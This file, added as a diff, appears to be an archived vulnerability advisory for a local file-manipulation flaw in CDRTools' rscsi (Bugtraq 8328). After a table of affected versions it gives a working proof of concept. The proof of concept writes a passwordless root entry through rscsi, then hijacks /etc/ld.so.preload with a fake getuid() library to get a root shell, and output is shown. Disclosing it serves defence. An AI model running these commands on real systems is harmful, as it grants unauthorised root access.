@@ -1,0 +1,118 @@
+#SpeeDr00t@Black Falcon<br>#bid8328<p><b><span style="font-size: 18pt;">CDRTools RSCSI Debug File Arbitrary Local File Manipulation Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/8328/info">info</a><br><a href="http://www.securityfocus.com/bid/8328/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/8328/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/8328/solution">solution</a><br><a href="http://www.securityfocus.com/bid/8328/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				8328
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 01 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Aug 01 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this vulnerability has been credited to Secure Network Operations, Inc.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					CDRTools CDRTools 2.0.3 <br/>
+					
+				
+					CDRTools CDRTools 2.0 <br/>
+<span class="related">
+						
+							+ 
+						
+						Ubuntu Ubuntu Linux 4.1 ppc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Ubuntu Ubuntu Linux 4.1 ia64<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Ubuntu Ubuntu Linux 4.1 ia32<br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					CDRTools CDRTools 2.0.1 a18<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept has been supplied:<br/><br/>$ echo C`echo -e <br/>"\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08r00t::0:0:root:/:/bin/bash\x0a"` | <br/>/opt/schily/sbin/rscsi /tmp/lala<br/><br/><br/>kf@vegeta kf$ ls -al /etc/ld.so.preload<br/>ls: /etc/ld.so.preload: No such file or directory<br/>kf@vegeta kf$ cat &gt; oops.c<br/>int getuid(void)<br/>{<br/>return(0);<br/>}<br/>kf@vegeta kf$ gcc -c -o oops.o oops.c<br/>kf@vegeta kf$ ld -shared -o oops.so oops.o<br/>kf@vegeta kf$ ls -al oops.so<br/>-rwxrwxr-x    1 kf       kf           1714 Jul 30 18:53 oops.so<br/>kf@vegeta kf$ echo duh_kf | /opt/schily/sbin/rscsi /etc/ld.so.preload<br/>E0<br/>Garbage command<br/>0<br/>-rw-rw-r--    1 root     kf              1 Jul 30 19:29 /etc/ld.so.preload<br/>kf@vegeta kf$ echo /home/kf/oops.so &gt; /etc/ld.so.preload<br/>kf@vegeta kf$ su<br/>root@vegeta kf# rm /etc/ld.so.preload<br/>rm: remove regular file `/etc/ld.so.preload'? y<br/>root@vegeta kf# id<br/>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+	
+		<ul>
+</ul>
+</div>
